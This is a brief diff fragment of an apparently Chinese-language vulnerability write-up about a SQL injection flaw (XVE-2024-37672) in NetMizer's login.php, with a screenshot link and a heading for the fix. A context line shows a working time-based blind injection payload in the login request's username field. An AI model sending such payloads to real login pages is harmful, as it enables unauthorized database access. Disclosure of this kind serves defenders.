@@ -99,9 +99,7 @@ action=login&username='%20OR%20SLEEP(6)--%20qAZp&passwd=1
 ![image-20250304151704570](./.resource/NetMizerdologin.phpsql注入漏洞XVE-2024-37672/media/image-20250304151704570.png)
 
 
-```
 
-```
 
 # 漏洞修复
 
